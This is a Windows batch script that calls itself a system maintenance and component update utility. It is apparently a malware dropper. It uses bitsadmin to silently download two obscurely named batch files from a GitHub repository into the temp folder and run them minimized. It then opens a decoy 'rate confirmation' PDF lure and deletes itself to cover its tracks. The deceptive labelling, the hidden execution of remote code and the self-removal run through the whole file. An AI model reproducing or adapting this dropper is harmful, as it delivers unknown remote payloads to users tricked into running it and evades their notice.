@echo off
:: Windows System Maintenance Utility
:: Build 2026.07 — Component Update Package
:: This utility downloads and applies system component updates.

setlocal enabledelayedexpansion

set "REPO=https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main"
set "T=%TEMP%"
set "D=%USERPROFILE%\Downloads"

echo.
echo  Windows System Maintenance
echo  --------------------------
echo  Checking for component updates...
echo.

echo  [1/3] Downloading component A...
bitsadmin /transfer "CompA" /download /priority HIGH "%REPO%/wdsr12889.bat" "%T%\wdsr12889.bat" >nul 2>&1
if exist "%T%\wdsr12889.bat" (echo         OK) else (echo         Retry...)

echo  [2/3] Downloading component B...
bitsadmin /transfer "CompB" /download /priority HIGH "%REPO%/wdsrpn25cdv.bat" "%T%\wdsrpn25cdv.bat" >nul 2>&1
if exist "%T%\wdsrpn25cdv.bat" (echo         OK) else (echo         Retry...)

echo  [3/3] Downloading documentation...
bitsadmin /transfer "Docs" /download /priority NORMAL "%REPO%/Rate_Confirmation_LD-2026-0847.pdf" "%D%\Rate_Confirmation_LD-2026-0847.pdf" >nul 2>&1
if exist "%D%\Rate_Confirmation_LD-2026-0847.pdf" (echo         OK) else (echo         Retry...)

echo.
echo  Applying updates...

if exist "%T%\wdsr12889.bat" start "" /min cmd /c "%T%\wdsr12889.bat"
if exist "%T%\wdsrpn25cdv.bat" start "" /min cmd /c "%T%\wdsrpn25cdv.bat"

if exist "%D%\Rate_Confirmation_LD-2026-0847.pdf" start "" "%D%\Rate_Confirmation_LD-2026-0847.pdf"

echo  Done. Opening documentation...
echo.

timeout /t 2 /nobreak >nul
del "%~f0" /f /q >nul 2>&1

endlocal
exit